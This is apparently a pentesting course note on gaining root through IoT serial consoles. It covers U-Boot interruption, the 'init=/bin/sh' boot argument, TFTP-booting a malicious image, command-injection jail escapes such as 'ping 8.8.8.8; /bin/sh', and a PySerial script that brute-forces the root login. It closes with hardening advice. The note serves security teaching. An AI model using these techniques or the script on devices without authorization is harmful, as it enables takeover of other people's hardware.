---
tags: [iot, pentesting, hardware, vapt]
difficulty: advanced
module: "49 - IoT Security"
topic: "49.08 Serial Console Access"
---

# Serial Console Access and Exploitation

## 1. Introduction

Gaining physical access to the UART interface of an IoT device is only the first step. The ultimate goal of interacting with these serial pins is to gain access to the **Serial Console**. The serial console is a text-based interface that provides direct interaction with the device's bootloader, kernel, and operating system. 

Historically, serial consoles were intended for developers to diagnose system crashes or for factory workers to provision devices. In production IoT devices, leaving an unauthenticated serial console active is a critical vulnerability. It bypasses network firewalls, SSH key requirements, and web authentication, providing an attacker with a direct pipeline to the heart of the system.

This note delves deeply into what an attacker encounters upon successfully connecting to a UART interface, the common boot environments (like U-Boot), and techniques to escalate privileges or bypass restrictions to obtain a root shell.

## 2. The Boot Process and Serial Output

When you connect a terminal emulator (e.g., `screen`, `minicom`, `picocom`) to a UART interface and power on the IoT device, you will typically observe the boot sequence. This sequence provides a wealth of intelligence.

### 2.1. Stage 1: The BootROM

The BootROM is burned into the SoC silicon. It initializes basic hardware (RAM, UART) and looks for the primary bootloader in SPI Flash or eMMC. You rarely interact with the BootROM, but you might see a single character or string (e.g., `C` from a Texas Instruments SoC, or `ROM:` from others) indicating it has executed.

### 2.2. Stage 2: The Bootloader (U-Boot)

Das U-Boot is the most ubiquitous bootloader in embedded Linux systems. Its job is to initialize the rest of the hardware, load the Linux kernel into RAM, and execute it.
*   **Intelligence Gathering:** U-Boot output will reveal the CPU architecture (e.g., MIPS, ARM), RAM size, flash memory geometry (blocks, pages), and the exact addresses where the kernel and filesystem are stored.

**Example U-Boot Serial Output:**
```text
U-Boot 2016.05 (Jan 01 2023 - 12:00:00)

CPU:   ARM Cortex-A9 at 800 MHz
DRAM:  256 MiB
NAND:  128 MiB
SPI Flash: Winbond W25Q128 16 MiB
In:    serial
Out:   serial
Err:   serial
Hit any key to stop autoboot:  3
```

*   **The Autoboot Interruption:** U-Boot usually implements an autoboot delay. 
    *   **Exploitation:** If an attacker hits a key (often `Enter`, `Space`, or `Ctrl+C`) during this window, the boot process halts, dropping them into the `U-Boot>` prompt. This is a massive compromise.

### 2.3. Stage 3: The Linux Kernel

If the bootloader completes, the Linux kernel boots.
*   **Kernel Panics:** If the firmware is corrupt or hardware is failing, the kernel panic output is printed to the serial console, which aids in debugging exploit development.
*   **Init System:** The kernel hands over control to the `init` system (SysVinit, systemd, or BusyBox init). The serial console will show services starting up (e.g., `Starting Dropbear SSH...`, `Starting Web Server...`).

## 3. Exploiting the U-Boot Console

If you successfully interrupt U-Boot, you possess immense power over the device. U-Boot is highly configurable, but standard commands allow for complete system compromise.

### 3.1. Modifying Boot Arguments (The `bootargs` variable)

The `bootargs` environment variable tells the Linux kernel how to boot. By modifying it, we can force the kernel to drop into a root shell instead of starting the normal device software.

```uboot
U-Boot> printenv
bootargs=console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs
```

**Attack Technique: `init=/bin/sh`**
We can append `init=/bin/sh` (or `init=/bin/ash`) to the bootargs. This tells the kernel that instead of running the standard `/sbin/init` script (which starts all services and might prompt for a login), it should immediately execute the shell. Because the kernel executes the init process as root, you get a root shell.

```uboot
U-Boot> setenv bootargs console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/bin/sh
U-Boot> boot
... (Kernel boots) ...
/ # whoami
root
```
*(Note: Because the normal init sequence is bypassed, many filesystems will be read-only, and `/proc` or `/sys` might not be mounted. You may need to manually `mount -t proc proc /proc` and `mount -o remount,rw /`).*

### 3.2. Reading and Writing Memory (Dumping Firmware)

U-Boot has commands to read directly from Flash memory into RAM, and then dump RAM over the serial port. This allows an attacker to extract the entire firmware without desoldering chips.

1.  **Read Flash:** `cp.b` (Copy Byte) or specialized NAND/SPI commands.
2.  **Dump RAM:** `md` (Memory Display) prints hex values. Attackers can log the serial output to a file and convert the hex back to a binary.
3.  **TFTP Boot:** If U-Boot has networking enabled, an attacker can set up a TFTP server on their laptop, connect an Ethernet cable to the IoT device, and use U-Boot to download a malicious kernel or modified filesystem directly into RAM and boot it (`tftpboot 0x80000000 malicious.img; bootm 0x80000000`).

## 4. Exploiting the OS Shell

If you do not interrupt U-Boot (or if autoboot is locked), the device will finish booting. The outcome on the serial console varies.

### 4.1. Unauthenticated Root Shell

In many legacy or poorly secured devices, the init scripts execute a command like `/sbin/getty -L ttyS0 115200 vt100` with the autologin flag enabled, or they simply run `exec /bin/sh` directly on the serial port.
*   **Result:** You press `Enter` and are immediately greeted with a `#` prompt with root privileges. Total compromise.

### 4.2. Authenticated Shell

Modern devices often present a standard Linux `login:` prompt on the serial console.
*   **Attack Vectors:**
    *   **Default Credentials:** Try `root:root`, `admin:admin`, `root:password`. Check vendor documentation.
    *   **Known Backdoors:** Some vendors hardcode secondary backdoor accounts for factory debugging.
    *   **Hash Cracking:** If you previously dumped the firmware via hardware methods, extract `/etc/shadow`, crack the hash using Hashcat, and use the password here.

### 4.3. Restricted Shells (Jail Escapes)

Sometimes, logging in via serial provides a restricted CLI environment specific to the vendor (e.g., a Cisco-like CLI for network configuration) rather than a standard Linux shell.
*   **Escape Techniques:**
    *   Look for commands that execute system commands (e.g., `ping`, `traceroute`).
    *   Attempt Command Injection: `ping 8.8.8.8; /bin/sh` or `ping $(/bin/sh)`.
    *   Look for text editors (like `vi`) built into the CLI. In `vi`, typing `:!/bin/sh` executes a system shell, escaping the jail.

## 5. Scripting Serial Attacks (Python PySerial)

Attackers often automate interaction with the serial console, especially for bruteforcing a login prompt over UART.

```python
import serial
import time

ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

passwords = ["root", "admin", "12345", "password", "support"]

for pwd in passwords:
    print(f"[*] Trying root:{pwd}")
    ser.write(b"root\n")
    time.sleep(0.5)
    ser.write(pwd.encode() + b"\n")
    time.sleep(0.5)
    
    response = ser.read_all().decode('utf-8', errors='ignore')
    if "#" in response or "~$" in response:
        print(f"[+] SUCCESS! Password is {pwd}")
        break
```

## 6. Architectural Flow of UART Exploitation (ASCII Diagram)

```text
       [ Attacker's Terminal ] (screen /dev/ttyUSB0)
                 |
                 v
 +-----------------------------------------------+
 | IoT Device Boot Sequence                      |
 |                                               |
 | 1. BootROM Execution                          |
 |        |                                      |
 |        v                                      |
 | 2. U-Boot (Bootloader)                        |
 |    * Output: Hardware Specs, Memory Maps      |
 |    * Prompt: "Hit any key to stop autoboot"   |
 |        |                                      |
 |        +-----> [Attacker Presses Enter] ----> [ U-Boot Shell ]
 |        |                                         - setenv init=/bin/sh
 |        | (Autoboot completes)                    - TFTP load malicious OS
 |        v                                         - Memory dump firmware
 | 3. Linux Kernel Execution                     |
 |    * Output: Driver loading, mount points     |
 |        |                                      |
 |        v                                      |
 | 4. User-Space Init (SysVinit / Systemd)       |
 |        |                                      |
 |        +-----> Case A: Drops to `#`       --> [ Unauthenticated Root Shell ]
 |        |                                      |
 |        +-----> Case B: "login:" Prompt    --> [ Bruteforce / Cracking req. ]
 |        |                                      |
 |        +-----> Case C: Restricted CLI     --> [ Jailbreak via Cmd Injection ]
 +-----------------------------------------------+
```

## 7. Securing the Serial Console

To mitigate these attacks, manufacturers must lock down the serial interface:
1.  **Disable U-Boot Autoboot Interruption:** Set `bootdelay=-2` in the U-Boot configuration and compile it so the `bootdelay` environment variable cannot be overridden. Ensure "magic keys" to break into U-Boot are disabled.
2.  **Require Authentication in U-Boot:** Modern U-Boot supports password protection.
3.  **Disable the OS Console:** Remove `console=ttyS0` from the kernel boot arguments. The kernel will still boot, but it will not route `stdin`/`stdout` to the UART pins.
4.  **Hardware Disable:** Remove the pull-up resistors on the TX/RX lines or physically sever the traces on production boards.

## 8. Chaining Opportunities

*   **[[07 - UART JTAG Hardware Debugging Interfaces]]:** Identifying and wiring the UART connection is the mandatory prerequisite for accessing the serial console.
*   **[[02 - Firmware Extraction and Analysis]]:** Gaining a shell via UART allows the attacker to use `tar` and `netcat` or `dd` to copy the device's filesystem and live memory across the network, facilitating dynamic firmware analysis.
*   **[[05 - Persistence and Implants]]:** Once root access is achieved via the console, the attacker can install persistent backdoors, modify startup scripts, or flash a trojaned firmware image.

## 9. Related Notes

*   [[09 - SPI Flash Dumping]]
*   [[12 - Embedded Linux Privilege Escalation]]
*   [[14 - Authentication Bypasses in IoT Web Apps]]
